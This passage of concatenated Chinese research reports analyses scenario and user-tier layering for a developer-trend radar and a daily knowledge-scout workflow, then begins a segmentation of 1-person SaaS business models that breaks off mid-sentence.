`Product of the Day / Week / Month` 明确做成日、周、月时间窗；categories 被定义为帮助用户按“要解决的问题”发现产品；collections 用来 bookmark 和组织发现到的产品；Product Pages 又把一个产品历次 launches、reviews、team members、awards、news 汇总到一个长期页面；forums 则明确服务于提问、获取反馈和与 makers/tech enthusiasts 交流。[S6][S7][S8][S10][S11]\\n- [事实] Reddit 把 feed 拆成 Home、Popular、News、Latest、r/all；Home recommendations 用 ML 个性化 `Best` 排序，还允许用户关闭；custom feeds 允许把多个 communities 组合成一个主题化 feed；Answers 会跨 communities 总结 posts/comments，并附带 in-line citations 回指原帖原评论。[S12][S13][S14][S15]\\n- [事实] X 把 `Lists`、`Topics`、`Trends`、`Search` 都做成不同 surface：Lists 用来按 group/topic/interest 组织账号并优先消费；Topics 可以 follow/unfollow，还能标记 `Not Interested`；Trends 提供个性化与非个性化两种查看方式，并允许反馈 harmful/spammy；Search 同时提供 `Top / Latest / People / Media / Lists` 等模式，Latest 明确是非个性化的时间序结果。[S16][S17][S18][S19][S20]\\n\\n### 2. 2025-2026 的平台设计都在强化“可编辑个性化”，而不是黑箱统一榜单\\n\\n- [事实] GitHub stars 页面允许用户把已 star 的 repositories / topics 放入不同 lists，并按名字搜索、按时间或热度排序、按语言和类型过滤。这是显式兴趣管理，而不是纯隐式推荐。[S2]\\n- [事实] Reddit Home recommendations 明确说明 Best 排序会参考账号新旧、过去点赞/评论过的内容类型等行为；但同一文档也明确给出关闭开关。custom feeds 则进一步允许用户手动把多个 communities 组合为私有或公开 feed。[S12][S13]\\n- [事实] X Topics 文档写明，用户可以把某些 topics 标为 `Not Interested`，系统不再用它们做个性化；X 的 recommendations 文档也强调 controls 是系统的一部分，用户能在 `For You` 与 `Following` 之间切换，也能通过 mute、block、report 等方式控制结果。[S17][S20]\\n- [事实] X Search Recommendations 说明 Latest search 是非个性化时间序结果；Trends Recommendations 也说明用户可改看 non-tailored trends，并通过反馈直接影响后续看到的趋势内容。[S18][S19]\\n- [事实] HN FAQ 的 `hide` 与 repost burying，本质上也是手动与站点治理共同参与的过滤；Product Hunt 则通过 `Featured` 与 `All` 的切换，让用户可同时看到“编辑/社区共同策展层”与“完整提交层”。[S4][S9]\\n\\n### 3. 同一主题的公共信号，本来就会经历 `发现 -> 验证 -> 跟踪`，不是一个榜单能包掉\\n\\n- [事实] GitHub Trending、HN `newstories`/`showstories`、X Trends 都偏向短窗发现；Product Hunt 的 Day / Week / Month 明确是不同节奏的 launch 窗口；Product Pages、GitHub stars lists、Reddit custom feeds、X Lists 又明显更适合长期跟踪。[S1][S2][S5][S6][S8][S13][S16][S18][S19]\\n- [事实] Reddit Answers 与 X Search 都不是简单榜单，而是在做跨帖子/跨账号的检索、聚合和排序；这更接近“验证和补上下文”而不是“发现新东西”的工位。[S15][S19]\\n- [事实] Product Hunt forums、HN comments/thread、Reddit communities、X search/top/latest，本身都是“热度之外的讨论层”；它们提供的是观点、抱怨、用法、反对意见和工作流细节，而不只是 launch 或热榜位置。[S4][S11][S15][S19]\\n\\n## 推断\\n\\n### 1. 最稳的分层轴应是 `场景目标 x 用户层级 x 决策阶段`\\n\\n- [推断 | 高置信度] 如果只按平台切分，例如“GitHub 雷达”“Reddit 雷达”“X 雷达”，最终会得到 5 个并列抓取器，而不是一个好用的雷达。真正决定产品形态的，是用户现在想完成什么决策、能承受多大噪声、以及这个信号距离行动有多近。\\n- [推断 | 高置信度] 因而，维度5 的正确骨架应该是：\\n  1. `场景目标`：你想发现、筛选、跟踪还是决策？\\n  2. `用户层级`：你是个人 builder、重度 power user、maintainer/founder，还是策略/分析角色？\\n  3. `决策阶段`：你现在是在扫一眼、交叉验证、持续监控，还是准备行动？\\n\\n### 2. 至少存在 5 类稳定适用场景，而且它们不该共用同一个默认排序\\n\\n| 场景 | 核心问题 | 最适合的 source mix | 噪声容忍度 | 推荐输出 |\\n| --- | --- | --- | --- | --- |\\n| `S1 Weak-Signal Scout` | 过去 24-72 小时什么新东西正在浮出水面？ | GitHub Trending + HN new/show + X Trends/Lists | 高 | `Now Feed`，轻去重、强 freshness |\\n| `S2 Workflow Tool Scout` | 对我的技术栈/工作流，哪些项目或工具值得试？ | GitHub topics/stars + Reddit custom feeds/Answers + HN ask/show + Product Hunt categories/products | 中 | `Scout Feed`，强调 workflow fit |\\n| `S3 Launch / Competitive Watch` | 哪些产品正在 launch，怎么被包装，是否开始外溢？ | Product Hunt leaderboard/Product Pages/forums + X + GitHub Trending | 中高 | `Launch Board`，强调 narrative spillover |\\n| `S4 Sentiment / Risk Monitor` | 开发者真实喜欢、讨厌、质疑什么？ | Reddit Answers/communities + HN threads + X search top/latest + Product Hunt comments/forums | 中 | `Risk & Sentiment View`，强调 controversy |\\n| `S5 Strategy / Portfolio Digest` | 哪些主题已从热点升级为值得长期跟的 lane？ | 五源聚类后的 cross-source confirmed clusters | 低 | `Weekly Digest`，强调 persistence 与 explanation |\\n\\n- [推断 | 高置信度] `S1` 和 `S5` 最不该被混成一个产品面。前者追求 `recall + speed`，后者追求 `precision + synthesis`。如果用同一榜单兼顾两者，结果通常会既不够新，也不够稳。\\n- [推断 | 高置信度] 对当前已确认的主轴 `AI coding agents + MCP/Skills + browser/computer use`，`S1` 负责先抓到 launch 和新 workflow，`S2` 负责判断是否跟你的 stack 有关，`S4` 负责吸收开发者抱怨和反模式，`S5` 才负责判断它是否真正升级为稳定趋势。\\n\\n### 3. 用户层级至少应拆成 4 档，否则体验一定错配\\n\\n| 用户层级 | 主要目标 | 最怕什么 | 最优默认工位 |\\n| --- | --- | --- | --- |\\n| `L1 个人 builder / 学习者` | 找到本周值得点开的项目、工具、讨论 | 信息流过载、需要太多配置 | `Now + Scout`，低摩擦、强 user fit |\\n| `L2 Power user / indie hacker / toolsmith` | 高召回、可编辑过滤、可自己拼 watchlist | 只有总结、无法深挖原始证据 | 多 lane watchlist，允许 source weights 和 negative preferences |\\n| `L3 Maintainer / founder / devtools team` | 看 launch、竞品、社区反馈、风险与 adoption | 只有热度，没有叙事/情绪/争议解释 | `Launch + Risk` 双视图，支持团队共享 |\\n| `L4 Strategy / analyst / platform team` | 识别结构性 lane、跨源确认和持续变化 | 原始帖过多、缺少主题级 synthesis | `Weekly Digest + cluster memo`，强调 why now |\\n\\n- [推断 | 高置信度] `L1` 需要的是“下一步试什么”，而不是“今天有 37 个热帖”；`L4` 需要的是“哪个 lane 在连续升温”，而不是每条原始链接。它们使用同一算法和输出密度，几乎必然一起失败。\\n- [推断 | 中高置信度] `L3` 是这个题目里最容易被忽视但最值钱的一层。因为 maintainer / founder / devtools team 并不只是想“发现工具”，更想知道讨论在往 `真实采用` 还是 `高噪声 hype` 方向走。\\n\\n### 4. 阶段分层比“读了多少源”更重要，因为每个阶段的退出条件不同\\n\\n| 阶段 | 当前决策 | 应强调的能力 | 代表性 source mix | 推荐 artifact |\\n| --- | --- | --- | --- | --- |\\n| `Stage 0 Discover` | 值不值得点开？ | freshness、novelty、去重 | GitHub Trending、HN new/show、X Trends | `Now item / raw cluster` |\\n| `Stage 1 Validate` | 这是不是一个真的信号？ | cross-source confirmation、quality/trust、基本解释 | GitHub topics/stars、HN top/best、PH day/week、Reddit Answers、X top vs latest | `validated cluster` |\\n| `Stage 2 Track` | 需要持续跟吗？ | watchlist、lane grouping、长期页面 | GitHub lists、PH Product Pages/collections、Reddit custom feeds、X Lists/Topics | `watch entity / watch lane` |\\n| `Stage 3 Decide` | 我要不要试、写、投、做、忽略？ | user fit、risk note、summary | 五源证据包 + 人工结论 | `decision memo / weekly digest` |\\n\\n- [推断 | 高置信度] `Stage 0` 的主损失函数是漏掉新东西；`Stage 3` 的主损失函数是误导决策。两者应使用不同权重、不同去重阈值、不同输出节奏。\\n- [推断 | 中高置信度] 对于开发者主题，`Stage 1` 往往是最关键工位。因为很多热点并不是“假”，而是“在某些角色/阶段很真，在另一些角色/阶段很假”。这正是解释层和 user-fit 分层必须存在的原因。\\n\\n### 5. 这类雷达的好 fit / 坏 fit 边界很清晰\\n\\n- [推断 | 高置信度] 好 fit 场景：\\n  1. `公开信号的早期发现`\\n  2. `开发者工具/工作流的 personalized scouting`\\n  3. `launch + 反馈 + 讨论` 的组合监控\\n  4. `主题 watchlist` 与周报摘要\\n  5. `从 hype 到 adoption` 的跨源转化观察\\n\\n- [推断 | 高置信度] 坏 fit 场景：\\n  1. `私有企业真实采用率`\\n  2. `封闭 Discord / Slack / paid community` 内部情报\\n  3. `真实收入、留存、市场份额`\\n  4. `未经 hands-on 测试的工具质量结论`\\n  5. `投资尽调级别的单项定论`\\n\\n- [推断 | 中高置信度] 因而，开发者趋势雷达最稳的定位不是“真相引擎”，而是 `early-detection + routing + prioritization layer`。它负责告诉你“现在先看什么、为什么看、适合谁看”，不负责替代深入评测和真实采用验证。\\n\\n## 建议\\n\\n### 1. 产品输出不要只有一个榜，至少拆成 4 个工位\\n\\n- [建议 | 前提：后续 Round 3 要输出可落地 spec] 默认拆成：\\n  1. `Now`：面向 `S1`，近 24-72h 弱信号\\n  2. `Scout`：面向 `S2`，与用户 workflow 强相关的可试列表\\n  3. `Watch`：面向 `S3/S4`，围绕 entity / lane 的持续跟踪\\n  4. `Digest`：面向 `S5`，带解释的周报和决策摘要\\n\\n- [建议 | 前提：不想让强信号主轴淹没全局] 所有工位都应做 `lane caps / diversity`，避免 `AI coding agents + MCP/Skills + browser/computer use` 一条 lane 吞掉全部版面。\\n\\n### 2. 用户画像不要只存 topic tag，至少补 5 类偏好\\n\\n- [建议 | 前提：后续要做个性化] 建议 profile schema 至少包含：\\n  1. `role`：builder / toolsmith / maintainer / founder / analyst\\n  2. `object_preference`：repo / launch / discussion / topic / account / workflow\\n  3. `source_trust_preference`：更信 GitHub/Reddit/HN 还是更愿意看 X/PH 早信号\\n  4. `time_horizon`：实时、日报、周报\\n  5. `negative_preferences`：不想看哪些主题、哪些来源、哪些对象类型\\n\\n- [建议 | 前提：想让推荐可纠偏] explanation 层应明确显示：\\n  1. `为什么推给你`\\n  2. `这个 cluster 主要来自哪些 source role`\\n  3. `它现在处在哪个阶段`\\n  4. `下一步建议是试用、观察还是忽略`\\n\\n### 3. 排序也应按场景切换，而不是一个总分走天下\\n\\n- [建议 | 前提：下一轮要进入关键变量与权重] 推荐先做 `scenario-specific scorecards`：\\n  - `Weak-Signal Scout`：更看 `freshness + novelty + source novelty`\\n  - `Workflow Tool Scout`：更看 `workflow fit + community proof + quality/trust`\\n  - `Launch Watch`：更看 `launch visibility + spillover + maker/community engagement`\\n  - `Risk Monitor`：更看 `controversy + discussion depth + practitioner complaints`\\n  - `Strategy Digest`：更看 `cross-source confirmation + persistence + topic diversity`\\n\\n\\n====\\nFILE: reports/round1-dimension5-knowledge-scout-applicable-scenarios-and-layering.md\\n# Round 1 - 维度5: 适用场景与分层\\n\\n- 主题：每日知识侦察\\n- 任务：调研不同场景、用户层级或阶段下的差异化打法\\n- 完成日期：2026-04-18\\n- 研究窗口：`2025-01-01` 到 `2026-04-18`\\n- 研究方法：优先使用 2025-2026 官方产品文档与本地工作区资料；把当前 `~/Desktop/code` 的活跃工程生态视为主要落地样本\\n\\n## 结论摘要\\n\\n2025-2026 语境下，`daily knowledge scout` 不是一套对所有人都相同的流程，而是一个要按 `范围复杂度 x 协作负载 x 可信度要求` 分层的系统。最稳定的 4 类适用场景是：`单项目专题侦察`、`个人多仓操作系统`、`团队共享知识运营`、`高可信/治理型情报层`。[S1][S2][S3][S4][S5][S6][S7][S8][S9][S10][S11]\\n\\n主流产品已经把这种分层做成了产品形态。OpenAI 把 `deep research`、`Projects`、`Pulse` 拆成一次性深挖、项目级知识容器、日更交付三层；GitHub 把 `Copilot Spaces`、`Copilot Memory` 分别做成共享上下文层和 repository-scoped 持久记忆层；NotebookLM 把 notebook 明确限定为 `specific project` 的 source 容器；Sourcegraph 则把 saved searches 和 code monitoring 做成持续变化检测层。[S1][S2][S3][S4][S5][S6][S7][S8][S9][S10][S11]\\n\\n对当前本地场景来说，最重要的判断是：你已经不处于“单项目专题侦察”阶段，而处于 `个人多仓操作系统`，并且部分具备 `团队共享知识运营` 的结构特征。最近 7 天内，本地有 `34` 个活跃仓库、`54` 个活跃研究目录、`503` 份更新过的报告；同时还已经存在 `auto-run-agent`（外部记忆编排）、`remem`（项目记忆）、`rss-scout`（评分与降噪）、`looper`（目标池与节奏控制）这几层资产。因此，当前最合适的打法不是继续做 ad-hoc 搜索，而是把 `变化检测 -> 信号排序 -> 知识沉淀 -> 日更/周更分发` 串成稳定层级。[L1][L2][L3][L4][L5][L6][L7]\\n\\n## 事实\\n\\n### 1. 官方产品已经把“单项目专题侦察”定义成 source-scoped 容器\\n\\n- [事实] OpenAI `deep research` 的标准流程是：描述结果、选择来源（websites、uploaded files、connected apps）、审阅和修改研究计划、跟踪执行进度，最后获得带 citations/source links 的结构化报告；官方还明确写出，这类能力适合 `multi-step or in-depth questions`，尤其适合你想显式控制 sources 的场景。[S1]\\n- [事实] NotebookLM 明确把 notebook 定义成 `a collection of sources for a specific project`，并强调每个 notebook 相互独立、不能同时跨多个 notebooks 访问信息。[S7]\\n- [事实] 同一个 NotebookLM notebook 中，不仅可以聊天，还可以生成 reports、data tables、slide decks、infographics、audio/video overviews 等多种派生产物；NotebookLM chat 只使用所选 sources，并给出可回跳的 citations。[S7][S8]\\n\\n这说明第一类场景天然是 `project-scoped scout`：问题比较聚焦，source set 可控，目标是把某个专题或项目拆清楚，而不是长期追踪一个变化流。\\n\\n### 2. 官方产品已经把“持续型侦察”做成主动交付与持续监控\\n\\n- [事实] ChatGPT Pulse 会 `once a day` 做异步研究，并基于 past chats、memory 和 feedback，在第二天主动交付 visual summaries。[S2]\\n- [事实] Sourcegraph `saved searches` 可以持续监控 diffs 和 commits，并被官方直接描述为 common problems、best practices、refactor progress 的 `early warning system`。[S10]\\n- [事实] Sourcegraph `code monitoring` 会在每个新 commit 上运行查询，对新结果触发通知；官方列出的典型用例包括 secrets、anti-patterns、common typos、deprecated endpoint 新消费者等。[S11]\\n\\n这说明第二类场景不是“每天重新搜一圈”，而是 `持续监控 + 固定 cadence 交付`。一旦任务变成 recurring scout，变化检测层就比单次报告本身更关键。\\n\\n### 3. 协作型场景已经被产品明确区分为“共享知识运营”\\n\\n- [事实] OpenAI 在 `2025-10-23` 的 release notes 里把 shared projects 的典型用途写得很清楚：`group work`、`content creation`、`reporting`、`research`。项目内的 chats、uploaded files、custom instructions 都会成为共享上下文，团队成员可以在其上继续工作。[S3]\\n- [事实] GitHub Copilot Spaces 既支持个人账号也支持组织账号，官方写出其价值包括：`reduce repeated questions`、`support onboarding and reuse with self-service context that lives beyond chat history`。[S4]\\n- [事实] GitHub 对共享 Spaces 的协作用例也给出了非常明确的分层：`Onboarding`、`System knowledge`、`Style guides or review checklists`。这意味着在团队场景里，knowledge scout 的目标不只是“我今天看懂了什么”，而是“别人以后能否复用这组上下文”。[S5]\\n- [事实] NotebookLM 也支持 viewer/editor 共享模型，说明 source set、note、artifact 的多人协同已经是标准产品行为，而不是额外扩展。[S7]\\n\\n这说明第三类场景已经从“个人研究”升级为 `knowledge operations`：需要共享、复用、持续维护，而不是只生成一次性摘要。\\n\\n### 4. 高可信或治理型场景需要独立的约束层\\n\\n- [事实] OpenAI deep research 允许显式指定 specific sites，并强调 connected apps 只使用 read actions；官方在来源选择上把 `credibility and traceability matter` 直接写成场景理由。[S1]\\n- [事实] GitHub Copilot Memory 会在 repository 中持续学习，但 memory 是 repository-specific 的；GitHub 文档还明确写出，memory 在使用前会 against current codebase 做 validation，并会在 `28` 天后自动删除，以避免 stale information adversely affecting agentic decision making。[S6]\\n- [事实] GitHub 还把 Copilot Memory 的开关拆到个人、组织、企业多层策略控制中，说明一旦进入组织环境，memory 已经是治理对象，而不是单纯的效率功能。[S6]\\n\\n这说明第四类场景不是“知识更多”，而是 `知识更受控`：要考虑 source boundary、TTL、验证、权限和误用风险。\\n\\n### 5. 本地工作区已经天然跨越多个层级，且更接近“个人多仓操作系统”\\n\\n- [事实] `/Users/lifcc/Desktop/code/AI/research/REPORTS_INDEX.md` 在 `2026-04-17` 记录已有 `31` 个 research runners、`475` 份 reports；而 `2026-04-18` 的本地统计显示，最近 7 天有 `54` 个研究目录、`503` 份更新过的报告。[L1][L2]\\n- [事实] 同一时间窗内，`~/Desktop/code` 下有 `34` 个仓库在最近 7 天发生过 `.git` 变化，涉及 `auto-run-agent`、`runtime`、`remem`、`rss-scout`、`looper`、`om-generator` 等多个域。[L2]\\n- [事实] `auto-run-agent` README 明确把 `TASKS.md -> CONTEXT.md -> DONE.md` 定义为“外部记忆”层，用于让多个短命 worker 串联完成长任务。[L3]\\n- [事实] `remem` README 直接把 `Session amnesia`、`No continuity` 作为要解决的核心问题，并采用 project-scoped 检索与 4-channel RRF 融合来做跨会话记忆检索。[L4]\\n- [事实] `rss-scout` roadmap 已经指出当前最大痛点是 `500 行扁平报告 68% 是版本号噪音`，并通过 `tier/kind` 和 `P0/P1/P2` 分层来解决；后续改进实验则进一步把知识侦察拆成 `Capture -> Distill -> Connect -> Compound`，并验证了三层架构与多阶段筛选的必要性。[L5][L6]\\n- [事实] `looper/WORKFLOW.md` 已经把 `targets`、`keywords`、`poll_interval_s`、`max_age_hours`、`rate_limits`、`weights`、`hot_topic` 等内容全部编码化，说明在外部信号流场景里，本地系统已经进入“可计算的 cadence 与分发控制”。[L7]\\n\\n这组本地证据说明：当前任务若继续按“单个 notebook/单份 report”的思路设计，会明显低配。\\n\\n## 推断\\n\\n- [推断 | 置信度：高] 最有效的分层轴不是“个人 vs 团队”这么粗，而是 `scope complexity x cadence x trust requirement`。同样是知识侦察，单项目专题拆解、多仓持续监控、团队知识共享、组织治理，要求的层完全不同。[S1][S2][S3][S4][S5][S6][S7][S10][S11]\\n- [推断 | 置信度：高] `source-scoped container` 适合专题问题，但一旦进入 recurring scout，就必须补上 `delta detection` 与 `ranking`；否则每天都在重复阅读旧材料，而不是识别新信号。[S2][S10][S11]\\n- [推断 | 置信度：高] 一旦进入共享或治理场景，知识侦察的中心就从“我如何更快理解”转向“别人如何安全复用这组上下文”。这也是 Projects、Spaces、Memory 都开始强调 sharing、roles、validation、TTL 的原因。[S3][S4][S5][S6]\\n- [推断 | 置信度：高] 当前本地环境最符合 `个人多仓操作系统` 场景，并开始触碰 `团队共享知识运营` 的边界。原因不是因为有多少工具，而是因为已经同时具备 `编排`、`记忆`、`评分`、`分发` 这些结构层。[L2][L3][L4][L5][L6][L7]\\n\\n## 适用场景矩阵\\n\\n| 场景 | 典型主体 | 核心问题 | 必要层 | 默认节奏 | 不该继续做的事 |\\n| --- | --- | --- | --- | --- | --- |\\n| `S1 单项目专题侦察` | 个人研究者、专题写作者、某个 repo/话题的深挖者 | 这个专题到底怎么回事？哪些 sources 最可信？ | source scope、citation、结构化报告 | 按专题触发 | 过早引入复杂监控与跨项目记忆 |\\n| `S2 个人多仓操作系统` | 独立开发者、个人研究者、运营多个项目的人 | 最近 7 天哪些变化真的值得进入知识库？ | 变化检测、排序去重、桥接综合、外部记忆 | 日更 + 周更 | 继续用平铺 changelog 或 ad-hoc 搜索 |\\n| `S3 团队共享知识运营` | 小团队、协作研发、内容或研究团队 | 怎么让别人复用同一组上下文，不再重复解释？ | shared container、角色权限、onboarding 文档、复用模板 | 日常协作 + 周期复盘 | 只写个人笔记，不做共享上下文治理 |\\n| `S4 高可信/治理型情报层` | 组织 owner、平台方、安全/合规场景 | 哪些知识能被保留、谁能用、什么时候过期？ | validation、TTL、权限、可追踪来源 | 持续运行 | 把临时观察直接当长期 canonical knowledge |\\n\\n## 用户层级分层\\n\\n| 用户层级 | 主要目标 | 默认要强化的层 | 默认弱化的层 |\\n| --- | --- | --- | --- |\\n| `L1 信号发现者` | 快速知道最近有什么值得看 | 搜索/发现、粗筛、来源可读性 | 复杂记忆治理 |\\n| `L2 构建者/执行者` | 把发现转成设计、实现、任务 | 排序、证据化综合、与当前项目的连接 | 纯展示型 artifact |\\n| `L3 知识维护者` | 把发现沉淀成长期可复用知识单元 | taxonomy、bridge note、去重、知识库存档 | 一次性摘要 |\\n| `L4 治理者` | 控制知识的范围、保鲜度和误用风险 | TTL、validation、权限、审计 | 无边界共享 |\\n\\n对当前研究主题而言，最重要的不是 L1，而是 `L2 + L3`：因为目标不是做一份“今日更新速览”，而是把变化转成可持续复用的个人知识库。\\n\\n## 阶段分层\\n\\n### Stage A: Scope\\n\\n- 选定时间窗、可信源、重点 repo、重点研究目录。\\n- 适用于所有场景。\\n\\n### Stage B: Detect\\n\\n- 只看最近 7 天新增或变化的对象。\\n- `S1` 可以轻量；`S2-S4` 必须强化。\\n\\n### Stage C: Rank\\n\\n- 做去重、评分、P0/P1/P2 分层。\\n- `S2` 开始成为必需层；没有这一层就会被噪音淹没。[L5]\\n\\n### Stage D: Connect\\n\\n- 把单条变化转成 insight：它改变了什么旧认知、连接了哪些项目、影响了哪些后续动作。\\n- `S1` 可选；`S2-S3` 非常关键；本地 `rss-scout` 改进实验已把这一步识别为核心缺口。[L6]\\n\\n### Stage E: Compound & Deliver\\n\\n- 写入记忆容器，并按 cadence 分发成日报/周报/专题报告。\\n- `S3-S4` 必需；`S2` 也已开始需要，因为当前本地活跃规模已经超过手工回忆阈值。[L2][L3][L4]\\n\\n## 对当前主题的直接建议\\n\\n### 1. 当前默认定位\\n\\n把“每日知识侦察”默认定位为 `S2 个人多仓操作系统`，而不是 `S1 单项目专题侦察`。\\n\\n原因：\\n\\n- 活跃 repo 数量已达 `34`，不是单专题规模。[L2]\\n- 最近 7 天已有 `503` 份报告更新，手工逐份重读不可持续。[L2]\\n- 本地已存在 memory、ranking、distribution 三类现成资产。[L3][L4][L5][L6][L7]\\n\\n### 2. 当前最合适的最小架构\\n\\n1. `Capture`\\n   - repo 变化扫描\\n   - 研究目录增量扫描\\n   - 少量高信任外部产品/文档源\\n2. `Rank`\\n   - 复用 `tier/kind`、`P0/P1/P2`、freshness/relevance 评分思路\\n3. `Connect`\\n   - 每条高价值信号补 `旧共识 -> 新发现 -> 为什么现在重要`\\n4. `Memory`\\n   - 把长期结论写入 `TASKS/CONTEXT/DONE` 与项目记忆，而不是只留在日报正文里\\n\\n====\\nFILE: reports/round1-dimension5-scenarios-and-segmentation.md\\n# Round 1 - 维度5：适用场景与分层\\n\\n日期：2026-04-18\\n主题：Indie Hacker 产品拆解（1-person SaaS）\\n\\n## 工作结论（推断，高置信度）\\n\\n2025-2026 语境下，1-person SaaS 不是一个“所有题都能用 solo founder 解”的统一模式，而是一种**只在特定边界内极其强大**的经营结构。\\n\\n最适合它的，不是所有 SaaS，而是这几类题：\\n\\n- `单点工作流明确`，能用一句话说清楚“替谁省什么时间/钱/复杂度”。\\n- `可以 self-serve 或低接触成交`，不需要重实施、重培训、重采购流程。\\n- `收费单位与成本单位能对齐`，尤其是 AI/native 场景里能用 credits、usage 或 hybrid 控住毛利。\\n- `例外处理率低`，也就是支持、退款、权限、账单、入门等边角流程可以产品化，而不是长期靠 founder 手工兜底。\\n\\n反过来，越接近 `enterprise procurement / 合规 / 定制交付 / 高频人工支持 / 多利益相关者销售`，就越容易把 1-person 模型推向“小团队公司”而不是“单人 SaaS”。\\n\\n## 适用性判断框架（推断，高置信度）\\n\\n判断一个题是否适合 Indie Hacker / 1-person SaaS，不要只问“市场大不大”，而要同时看 4 条轴：\\n\\n| 轴 | 要回答的问题 | 对 solo 更友好的信号 | 对 solo 更危险的信号 |\\n|---|---|---|---|\\n| `场景类型` | 这是哪种产品形态？ | 单点工具、窄 workflow、数据/内容资产、开发者工具 | 横向平台、复杂系统、跨部门系统 |\\n| `买家层级` | 谁在买，谁在用，谁在批？ | 个人、SMB owner、单部门负责人 | IT、法务、采购、多层审批 |\\n| `业务阶段` | 当前是在验证、初收、扩张还是上市场级别？ | 一个 ICP、一个主渠道、一个价值指标 | 多 ICP、多价格体系、多条销售路径 |\\n| `运营/合规负担` | 例外处理和审计负担有多高？ | 自助取消、FAQ、可控 usage、低合规 | SOC 2、MSA、定制 SLA、人工 onboarding |\\n\\n## 事实（Facts）\\n\\n### 1. 2026 的 bootstrapped SaaS 社群本身，就已经按 `阶段` 和 `收入层级` 在分层\\n\\n- MicroConf Connect 当前把用户池明确描述为 `300+ bootstrapped founders`，覆盖 `Pre-revenue to $10M ARR`，并说明社群讨论按 `stage and topic` 组织，同时目录支持按 `exact revenue stage` 过滤。[S1]\\n- 同页进一步把人群直接拆成两类：`Active Founders with a SaaS`，即从 `pre-launch to scaling` 的 B2B SaaS 创始人；以及 `Aspiring Founders with a Real Plan`，即还没发产品但已明确 problem/ICP 的准 founder。[S1]\\n- TinySeed 的 accelerator program 也明确写到，founder 会被放进按 `stage, industry, and/or sales process` 分组的小 mastermind；这说明在独立 SaaS 语境里，适用打法天然是分层的，而不是“一套 playbook 走到底”。[S2]\\n\\n### 2. `资本效率型 B2B SaaS` 仍然是 2026 最被系统化支持的一层\\n\\n- TinySeed 在 2026-02-06 的文章里把目标客群写得非常直接：`independent, capital-efficient B2B SaaS companies`，并强调对这类公司来说，做到 `$5-10M ARR` 就已经是“huge win”，核心目标是 `durability`、`founder control` 和可持续增长，而不是被推向 unicorn 路径。[S3]\\n- 同文也说明，它支持的是“different endgames”：可长期独立，也可在后续再融资，但前提都是先把业务做成 durable business。[S3]\\n\\n### 3. AI/prosumer 场景已经证明：只要输出可模板化、计费可控，单人模型可以很强\\n\\n- Photo AI 当前 FAQ 写到，产品已被 `thousands of paying creators, brands, and e-commerce stores` 使用，且业务上是 `75%-90% profit margins`、`100% automated`、`no employees`、`independent`。[S4]\\n- Photo AI 当前定价页显示，其月费层级是 `$19 / $49 / $99 / $199`，按 `AI Credits`、模型数量、并行生成数、商业授权和存储能力分层，而不是简单按 seat 收费。[S5]\\n\\n### 4. 小团队 workflow B2B 正在把 `seat pricing` 让位给 `usage / credits / hybrid`\\n\\n- Stripe 在 2025 的 AI pricing 指南中明确指出：AI usage 不均匀，底层成本是变量成本，因此当不同客户的任务量和推理成本差异很大时，`charging all customers the same per-seat fee` 并不合理；其文中还给出 `56%` 的 AI 公司已经采用 hybrid pricing。[S6]\\n- Stripe 同文把 `credit systems` 明确列为常见结构：客户预购 credits，企业则可以在不频繁改价的情况下重新映射单个动作的价值和成本。[S6]\\n- Steady 的定价页就是这种结构的实物版本：`Unlimited users`，但按 credits 使用收费；允许 ad-hoc top-up；没有自动 overage；额度用尽后停止 delivery 但保留 7 天数据收集。[S7]\\n\\n### 5. `数据/社区` 与 `开发者工具` 仍然是对 solo 非常友好的旧而有效的层\\n\\n- Nomads.com FAQ 公开写明：它使用 `HTML/CSS/JS + jQuery` 前端、`PHP + SQLite` 后端、单台 Ubuntu VPS + NGINX；同时，它强调自己是 `self service`，没有 customer support email，取消会员与退款都尽量让用户自行完成。[S8][S9]\\n- Sidekiq 的商业 FAQ 与 Build vs Buy 页面则展示了另一类 solo 友好结构：它不按 seat，而按生产环境 `worker threads` 授权；`Pro` 为 `$99/月`，`Enterprise` 从 `$269/月` 起，核心卖点是让用户直接买成熟基础设施，而不是自己造一遍。[S10][S11]\\n\\n### 6. 高 ARPU vertical B2B 可以做，但它天然更靠近 `小团队公司` 而不是 `纯 solo`\\n\\n- FlatPlan 当前 Apple News 页面显示：它是 `no-code solution`，`works with any CMS`，并且会处理 planning、design、build、QA 和持续支持；定价从 `$400/月` 起，同时采用 discovery call / custom quote 方式成交。[S12]\\n- TinySeed program 页面给出的 FlatPlan 案例补充了一个很关键的阶段信号：Kieran Delaney 在加入 TinySeed 时，产品已到 `~$300,000 ARR`，后续结果是收入继续放大、团队从 2 人增长到 18 人，并服务 300+ 媒体公司。[S2]\\n\\n### 7. 一旦开始 `moving upmarket`，solo 模型会立刻面对明确的时间与成本门槛\\n\\n- MicroConf 在 2026-04-10 的 SOC 2 指南里明确写到：很多 SaaS 公司是在 `moving upmarket and selling to enterprise companies` 时，才开始需要 SOC 2；准备通常要 `3-6 months`，Type 2 审计还要 `6 months to one year`，总成本低端也要 `$25,000+`。[S13]\\n- 同文还强调，这不是简单买个工具，而是需要内部 team、文档证据、gap analysis、incident response 与持续维护。[S13]\\n\\n## 推断（Inferences）\\n\\n### 1. 按场景类型分层：哪些题最适合 Indie Hacker\\n\\n| 场景层 | 典型产品形态 | 为什么适合/不适合 solo | 代表样本 | 综合判断 |\\n|---|---|---|---|---|\\n| `AI prosumer / creator tools` | 图片、视频、文案、设计、营销素材生成 | 适合：需求广、传播性强、可 credits 化、自助购买容易；不适合：同质化高、模型成本和审核成本容易失控 | Photo AI | `强适用` |\\n| `SMB / small-team workflow B2B` | 团队协作、运营流程、单部门效率工具 | 适合：ROI 容易讲清、可嵌入现有工作流、用户数少但使用深；不适合：一旦跨到 IT/安全/采购，复杂度急升 | Steady | `最强适用` |\\n| `Data / community / membership` | 数据聚合、榜单、社区会员、内容工具 | 适合：内容/数据可复利、支持面可压低、自助服务自然；不适合：数据采集和更新成本可能长期上升 | Nomads.com | `强适用` |\\n| `Developer tools / open-core commercialization` | SDK、infra、插件、pro/enterprise 扩展 | 适合：技术 buyer 理解快、价值明确、support 边界可控；不适合：需要创始人强技术信用，平台风险更高 | Sidekiq | `条件强适用` |\\n| `High-ARPU vertical B2B / service-as-software` | 垂直行业运营工具、出版/媒体/金融/招聘等窄工具 | 适合：单客户价值高、题目清晰；不适合：更容易引入 demo、实施、QA、支持和成功团队 | FlatPlan | `条件适用` |\\n| `Enterprise / compliance-heavy systems` | 安全、合规、核心数据系统、跨部门系统 | 采购链长、合规重、SLA/文档/证据要求高，除非 ACV 极高且 founder 愿意承受流程成本 | - | `弱适用` |\\n\\n高置信度判断：\\n\\n- 对 2025-2026 的 Indie Hacker 